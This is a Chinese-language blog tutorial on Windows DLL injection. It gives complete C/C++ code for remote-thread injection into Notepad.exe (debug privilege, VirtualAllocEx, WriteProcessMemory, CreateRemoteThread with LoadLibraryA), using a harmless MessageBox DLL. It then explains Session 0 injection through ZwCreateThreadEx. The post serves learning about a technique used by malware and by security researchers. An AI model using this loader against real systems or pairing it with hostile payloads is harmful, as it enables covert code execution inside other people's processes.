

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=auto>



<head>
  <meta charset="UTF-8">

  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
  <link rel="icon" href="/img/fluid.png">
  

  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="author" content="John Doe">
  <meta name="keywords" content="">
  
    <meta name="description" content="dll注入的前言dll注入的起源dll注入又称之为动态链接库注入。DLL 注入这个概念并没有一个明确的“最早提出者”，它更像是在 Windows 操作系统发展过程中，随着对系统内部机制的理解加深，逐渐被发现和利用的一种技术。 在 Windows NT 时代，一些病毒和恶意软件开发者为了实现持久化、隐藏自身或劫持其他程序的行为，开始探索各种技术，其中就包括了类似 DLL 注入的方法。他们可能没有明确">
<meta property="og:type" content="article">
<meta property="og:title" content="注入的技艺">
<meta property="og:url" content="http://example.com/2025/10/02/%E6%B3%A8%E5%85%A5%E7%9A%84%E6%8A%80%E8%89%BA/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="dll注入的前言dll注入的起源dll注入又称之为动态链接库注入。DLL 注入这个概念并没有一个明确的“最早提出者”，它更像是在 Windows 操作系统发展过程中，随着对系统内部机制的理解加深，逐渐被发现和利用的一种技术。 在 Windows NT 时代，一些病毒和恶意软件开发者为了实现持久化、隐藏自身或劫持其他程序的行为，开始探索各种技术，其中就包括了类似 DLL 注入的方法。他们可能没有明确">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510021659447.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510021705940.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510022221926.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510022222237.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510022240269.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510022243591.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510022312910.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510031528552.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510031535367.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510031618172.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510031635112.png">
<meta property="og:image" content="c:/Users/Administrator/AppData/Roaming/Typora/typora-user-images/image-20251003170846661.png">
<meta property="article:published_time" content="2025-10-02T06:44:13.000Z">
<meta property="article:modified_time" content="2025-10-03T09:32:34.406Z">
<meta property="article:author" content="John Doe">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510021659447.png">
  
  
  
  <title>注入的技艺 - Hexo</title>

  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />



  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />

  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />



<!-- 主题依赖的图标库，不要自行修改 -->
<!-- Do not modify the link that theme dependent icons -->

<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">



<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">


<link  rel="stylesheet" href="/css/main.css" />


  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
  
    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
  




  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    Fluid.ctx = Object.assign({}, Fluid.ctx)
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};

    if (CONFIG.web_analytics.follow_dnt) {
      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
    }
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
  


  
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
  

  <header>
    

<div class="header-inner" style="height: 70vh;">
  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand" href="/">
      <strong>yawataa</strong>
    </a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/" target="_self">
                <i class="iconfont icon-home-fill"></i>
                <span>Home</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/" target="_self">
                <i class="iconfont icon-archive-fill"></i>
                <span>Archives</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/" target="_self">
                <i class="iconfont icon-category-fill"></i>
                <span>Categories</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/" target="_self">
                <i class="iconfont icon-tags-fill"></i>
                <span>Tags</span>
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/" target="_self">
                <i class="iconfont icon-user-fill"></i>
                <span>About</span>
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
              <i class="iconfont icon-search"></i>
            </a>
          </li>
          
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
            </a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

  

<div id="banner" class="banner" parallax=true
     style="background: url('/img/sun.jpg') no-repeat center center; background-size: cover;">
  <div class="full-bg-img">
    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
      <div class="banner-text text-center fade-in-up">
        <div class="h2">
          
            <span id="subtitle" data-typed-text="注入的技艺"></span>
          
        </div>

        
          
  <div class="mt-3">
    
    
      <span class="post-meta">
        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
        <time datetime="2025-10-02 14:44" pubdate>
          October 2, 2025 pm
        </time>
      </span>
    
  </div>

  <div class="mt-1">
    
      <span class="post-meta mr-2">
        <i class="iconfont icon-chart"></i>
        
          7.7k words
        
      </span>
    

    
      <span class="post-meta mr-2">
        <i class="iconfont icon-clock-fill"></i>
        
        
        
          65 mins
        
      </span>
    

    
    
  </div>


        
      </div>

      
    </div>
  </div>
</div>

</div>

  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="side-col d-none d-lg-block col-lg-2">
      

    </div>

    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div id="board">
          <article class="post-content mx-auto">
            <h1 id="seo-header">注入的技艺</h1>
            
            
              <div class="markdown-body">
                
                <h1 id="dll注入的前言"><a href="#dll注入的前言" class="headerlink" title="dll注入的前言"></a>dll注入的前言</h1><h2 id="dll注入的起源"><a href="#dll注入的起源" class="headerlink" title="dll注入的起源"></a>dll注入的起源</h2><p>dll注入又称之为动态链接库注入。DLL 注入这个概念并没有一个明确的“最早提出者”，它更像是在 Windows 操作系统发展过程中，随着对系统内部机制的理解加深，逐渐被发现和利用的一种技术。</p>
<p>在 Windows NT 时代，一些病毒和恶意软件开发者为了实现持久化、隐藏自身或劫持其他程序的行为，开始探索各种技术，其中就包括了类似 DLL 注入的方法。他们可能没有明确提出“DLL 注入”这个术语，但他们的实践为这项技术的发展奠定了基础。</p>
<p>随着恶意软件的增多，安全研究人员和逆向工程师开始深入分析这些恶意软件的行为，并发现了 DLL 注入这种常见的攻击手段。他们对这项技术进行了详细的分析和解释，并将其命名为“DLL 注入”。</p>
<p>随着时间的推移，一些开源工具和框架（例如 Metasploit 等）开始集成 DLL 注入功能，使得这项技术更容易被安全研究人员、渗透测试人员和甚至一些恶意攻击者所使用。</p>
<h2 id="dll注入的分类"><a href="#dll注入的分类" class="headerlink" title="dll注入的分类"></a>dll注入的分类</h2><p>根据dll注入的代码和原理，分为很多类，包括但不限于，PE dll注入，hook dll注入(全局钩子或消息钩子)，远程dll注入，APC dll注入(以及衍生出来的Early bird注入)，Session 0注入，反射dll注入，注册表修改注入。 当然还有许许多多的我还并没有了解和研究的技术，如果之后有所涉及和学习，我会进一步做一个补充</p>
<h1 id="远程线程注入"><a href="#远程线程注入" class="headerlink" title="远程线程注入"></a>远程线程注入</h1><p>远程线程注入是最流行和最经典的注入方式了，也是最多文档资料介绍的DLL注入技术。</p>
<h2 id="一些辅助代码"><a href="#一些辅助代码" class="headerlink" title="一些辅助代码"></a>一些辅助代码</h2><h3 id="开启权限"><a href="#开启权限" class="headerlink" title="开启权限"></a>开启权限</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-type">BOOL</span> EnableDebugPrivilege()<br>&#123;<br>    HANDLE hToken;<br>    <span class="hljs-type">BOOL</span> fOk = <span class="hljs-keyword">FALSE</span>;<br>    <span class="hljs-keyword">if</span> (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &amp;hToken))<br>    &#123;<br>        TOKEN_PRIVILEGES tp;<br>        tp.PrivilegeCount = <span class="hljs-number">1</span>;<br>        LookupPrivilegeValue(<span class="hljs-keyword">NULL</span>, SE_DEBUG_NAME, &amp;tp.<span class="hljs-keyword">Privileges</span>[<span class="hljs-number">0</span>].Luid);<br>        tp.<span class="hljs-keyword">Privileges</span>[<span class="hljs-number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<br>        AdjustTokenPrivileges(hToken, <span class="hljs-keyword">FALSE</span>, &amp;tp, sizeof(tp), <span class="hljs-keyword">NULL</span>, <span class="hljs-keyword">NULL</span>);<br>        fOk = (GetLastError() == ERROR_SUCCESS);<br>        CloseHandle(hToken);<br>    &#125;<br>    <span class="hljs-keyword">return</span> fOk;<br>&#125;<br></code></pre></td></tr></table></figure>



<h3 id="根据进程名寻找PID"><a href="#根据进程名寻找PID" class="headerlink" title="根据进程名寻找PID"></a>根据进程名寻找PID</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java">DWORD <span class="hljs-title function_">GetProcessPID</span><span class="hljs-params">(<span class="hljs-type">char</span>* lpProcessName)</span> &#123;<br><br>    <span class="hljs-type">DWORD</span> <span class="hljs-variable">ret</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; <span class="hljs-comment">// 存储找到的进程ID，初始为0（未找到）</span><br>    PROCESSENTRY32 P32;<span class="hljs-comment">// 结构体，用于存储进程快照信息</span><br><br>    <span class="hljs-comment">//获取指定进程以及这些进程使用的堆、模块和线程的快照</span><br>    <span class="hljs-type">HANDLE</span> <span class="hljs-variable">IpSnashot</span> <span class="hljs-operator">=</span> CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (IpSnashot == INVALID_HANDLE_VALUE) &#123;<br>        printf(<span class="hljs-string">&quot;获取进程快照失败，请检查原因。erro:%d&quot;</span>, GetLastError());<br>    &#125;<br>    P32.dwSize = sizeof(PROCESSENTRY32);<br>    Process32First(IpSnashot, &amp;P32);<span class="hljs-comment">// 获取快照中第一个进程信息</span><br><br>    <span class="hljs-keyword">do</span> &#123;<br>        <span class="hljs-keyword">if</span> (!lstrcmp(P32.szExeFile, lpProcessName)) &#123;<span class="hljs-comment">// 比较进程名</span><br><br>            ret = P32.th32ProcessID;<span class="hljs-comment">// 匹配成功，记录PID</span><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">while</span> (Process32Next(IpSnashot, &amp;P32)); <span class="hljs-comment">//检索有关系统快照中记录的下一个进程的信息。</span><br>    CloseHandle(IpSnashot);<span class="hljs-comment">//关闭句柄 </span><br>    <span class="hljs-keyword">return</span> ret;<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h3 id="注入的dll"><a href="#注入的dll" class="headerlink" title="注入的dll"></a>注入的dll</h3><p>就是一个简单的弹窗代码。</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs objectivec"><span class="hljs-comment">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;pch.h&quot;</span></span><br><br><span class="hljs-type">BOOL</span> APIENTRY DllMain( HMODULE hModule,<br>                       DWORD  ul_reason_for_call,<br>                       LPVOID lpReserved<br>                     )<br>&#123;<br>    <span class="hljs-keyword">switch</span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        MessageBox(<span class="hljs-literal">NULL</span>, L<span class="hljs-string">&quot;yawataa&quot;</span>, L<span class="hljs-string">&quot;yawataa&quot;</span>, MB_OK);<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">TRUE</span>;<br>&#125;<br><br><br></code></pre></td></tr></table></figure>



<h2 id="注入的大概过程"><a href="#注入的大概过程" class="headerlink" title="注入的大概过程"></a>注入的大概过程</h2><p>实现步骤： </p>
<p>1.获取进程句柄 </p>
<p>通过进程名获取PID</p>
<p>2.计算dll路径长度 </p>
<p>3.调用 VirtualAllocEx 在进程里面申请内存 </p>
<p>4.拷贝dll路径到内存空间里面 </p>
<p>5.获取 kernel32.dll 的地址 </p>
<p>6.获取 LoadLibrary 的地址 </p>
<p>7.通过 CreateRemoteThread 创建远程线程加载dll </p>
<p>8.关闭句柄</p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;Tlhelp32.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">GetProcessPID</span><span class="hljs-params">(LPCTSTR lpProcessName)</span> </span>&#123;<br><br>	DWORD ret = <span class="hljs-number">0</span>; <span class="hljs-comment">// 存储找到的进程ID，初始为0（未找到）</span><br>	PROCESSENTRY32 P32;<span class="hljs-comment">// 结构体，用于存储进程快照信息</span><br><br>	<span class="hljs-comment">//获取指定进程以及这些进程使用的堆、模块和线程的快照</span><br>	HANDLE IpSnashot = <span class="hljs-built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="hljs-number">0</span>);<br>	<span class="hljs-keyword">if</span> (IpSnashot == INVALID_HANDLE_VALUE) &#123;<br>		<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取进程快照失败，请检查原因。erro:%d&quot;</span>,<span class="hljs-built_in">GetLastError</span>());<br>	&#125;<br>	P<span class="hljs-number">32.</span>dwSize = <span class="hljs-built_in">sizeof</span>(PROCESSENTRY32);<br>	<span class="hljs-built_in">Process32First</span>(IpSnashot, &amp;P32);<span class="hljs-comment">// 获取快照中第一个进程信息</span><br><br>	<span class="hljs-keyword">do</span> &#123;<br>		<span class="hljs-keyword">if</span> (!<span class="hljs-built_in">lstrcmp</span>(P<span class="hljs-number">32.</span>szExeFile, lpProcessName)) &#123;<span class="hljs-comment">// 比较进程名</span><br><br>			ret = P<span class="hljs-number">32.</span>th32ProcessID;<span class="hljs-comment">// 匹配成功，记录PID</span><br>			<span class="hljs-keyword">break</span>;<br>		&#125;<br>	&#125; <span class="hljs-keyword">while</span> (<span class="hljs-built_in">Process32Next</span>(IpSnashot, &amp;P32)); <span class="hljs-comment">//检索有关系统快照中记录的下一个进程的信息。</span><br>	<span class="hljs-built_in">CloseHandle</span>(IpSnashot);<span class="hljs-comment">//关闭句柄 </span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;进程ID为：%d\n&quot;</span>, ret);<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><br><span class="hljs-comment">//1.打开进程，获取进程句柄</span><br>    <br>    <span class="hljs-type">int</span> pid= <span class="hljs-built_in">GetProcessPID</span>(<span class="hljs-string">&quot;Notepad.exe&quot;</span>);<br><br>    HANDLE hProcess = <span class="hljs-built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, pid);<br><br>    <span class="hljs-keyword">if</span> (hProcess == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;打开进程失败，请检查原因。erro:%d&quot;</span>,<span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>	<span class="hljs-comment">//2.计算dll路径长度</span><br>	<span class="hljs-type">int</span> len = <span class="hljs-built_in">strlen</span>(<span class="hljs-string">&quot;F:\\c\\yawatadll\\x64\Release\\yawatadll.dll&quot;</span>)<span class="hljs-number">+1</span>;<br>    <br><br>	<span class="hljs-comment">//3.调用 VirtualAllocEx 在进程里面申请内存 </span><br><br>    LPVOID lpAddress = <span class="hljs-built_in">VirtualAllocEx</span>(hProcess, <span class="hljs-literal">NULL</span>, len, MEM_COMMIT, PAGE_READWRITE);<br>    <span class="hljs-keyword">if</span> (lpAddress == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;申请内存失败，请检查原因。erro:%d&quot;</span>,<span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>	<span class="hljs-comment">//4.将dll路径写入进程</span><br>    <span class="hljs-built_in">WriteProcessMemory</span>(hProcess, lpAddress, <span class="hljs-string">&quot;F:\\c\\yawatadll\\x64\\Release\\yawatadll.dll&quot;</span>, len, <span class="hljs-literal">NULL</span>);<br><br>	<span class="hljs-comment">//5.获取 kernel32.dll 的地址</span><br>    HMODULE hKernel32 = <span class="hljs-built_in">GetModuleHandleA</span>(<span class="hljs-string">&quot;kernel32.dll&quot;</span>);<br>    <span class="hljs-keyword">if</span> (hKernel32 == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取kernel32.dll失败，请检查原因。erro:%d&quot;</span>,<span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br><br>	<span class="hljs-comment">//6.获取 LoadLibrary 的地址</span><br>    FARPROC hLoadLibrary = <span class="hljs-built_in">GetProcAddress</span>(hKernel32, <span class="hljs-string">&quot;LoadLibraryA&quot;</span>);<br>    <span class="hljs-keyword">if</span> (hLoadLibrary == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;获取LoadLibrary失败，请检查原因。erro:%d&quot;</span>,<span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-comment">//7.创建远程线程进行执行</span><br>    HANDLE hThread = <span class="hljs-built_in">CreateRemoteThread</span>(hProcess, <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>, (LPTHREAD_START_ROUTINE)hLoadLibrary, lpAddress, <span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (hThread == <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;创建远程线程失败，请检查原因。erro:%d&quot;</span>,<span class="hljs-built_in">GetLastError</span>());<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    <span class="hljs-built_in">WaitForSingleObject</span>(hThread, INFINITE);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;注入成功！&quot;</span>);<br>    <span class="hljs-built_in">CloseHandle</span>(hThread);<br>    <span class="hljs-built_in">CloseHandle</span>(hProcess);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br><br><br></code></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510021659447.png" srcset="/img/loading.gif" lazyload alt="image-20251002165936270"></p>
<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510021705940.png" srcset="/img/loading.gif" lazyload alt="image-20251002170516861"></p>
<h1 id="Session-0注入"><a href="#Session-0注入" class="headerlink" title="Session 0注入"></a>Session 0注入</h1><p>这个注入是源于突破会话隔离的远程线程注入</p>
<h3 id="SESSION-0-隔离"><a href="#SESSION-0-隔离" class="headerlink" title="SESSION 0 隔离"></a>SESSION 0 隔离</h3><p>在Windows XP、Windows Server 2003，以及更老版本的Windows操作系统中，服务和应用程序使用相同的会话（Session）运行，而这个会话是由第一个登录到控制台的用户启动的。该会话就叫做 Session 0，如下图所示，在Windows Vista之前，Session 0不仅包含服务，也包含标准用户应用程序</p>
<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510022221926.png" srcset="/img/loading.gif" lazyload alt="image-20251002222124722"></p>
<p>将服务和用户应用程序一起在Session 0中运行会导致安全风险，因为服务会使用提升后的权限运行，而 </p>
<p>用户应用程序使用用户特权（大部分都是非管理员用户）运行，这会使得恶意软件以某个服务为攻击目 </p>
<p>标，通过“劫持”该服务，达到提升自己权限级别的目的</p>
<p>从Windows Vista开始，只有服务可以托管到Session 0中，用户应用程序和服务之间会被隔离，并需要 </p>
<p>运行在用户登录到系统时创建的后续会话中。例如第一个登录的用户创建 Session 1，第二个登录的用 </p>
<p>户创建Session 2，以此类推，如下图所示</p>
<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510022222237.png" srcset="/img/loading.gif" lazyload alt="image-20251002222215114"></p>
<p>更直观的我们可以在任务管理器中可以看见进程所在的会话层，如下图</p>
<p><img src="https://cdn.jsdelivr.net/gh/yawataa/image@main/img/202510022240269.png" srcset="/img/loading.gif" lazyload alt="image-20251002224004111"></p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>由于SESSION 0 隔离机制的存在，使得传统的远程线程注入系统服务进程失败，和传统的CreateRemoteThread函数实现的DLL远线程注入的唯一一个区别就是,我们调用的是更为底层的ZwCreateThreadEx来创建线程</p>
<p>ZwCreateThreadEx 函数可以突破SESSION 0 隔离，将DLL注入到SESSION 0 隔离的系统服务进程中， </p>
<p>CreateRemoteThread 注入系统进程会失败的原因是因为调用 ZwCreateThreadEx 创建远程线程时，第 </p>
<p>七个参数 CreateThreadFlags 为1 </p>
<p>使用 CreateRemoteThread 注入失败DLL失败的关键在第七个参数 CreateThreadFlags ， 他会导致线 </p>
<p>程创建完成后一直挂起无法恢复进程运行，导致注入失败 </p>
<p>ZwCreateThreadEx </p>
<p>ZwCreateThreadEx 是一个未文档化的API，但是可以通过 GetProcAddress 来获取其地址</p>
<p>(小tip)</p>
<p>未文档化的API:微软官方写了，但是不会拿出来给大家用，但是有大神逆向内核，逆出来了这个api的形式</p>
<p>未导出的API:微软官方写了，但是不会拿出来给大家用，自己偷偷用</p>
<p>（小tip）</p>
<p>同时有一个注意的点就是，ZwCreateThreadEx 在64位和32位的定义下是不一样的</p>
<p> 我们可以这样声明结构体(预编译的形式)，让代码自动选择对应的定义形式</p>
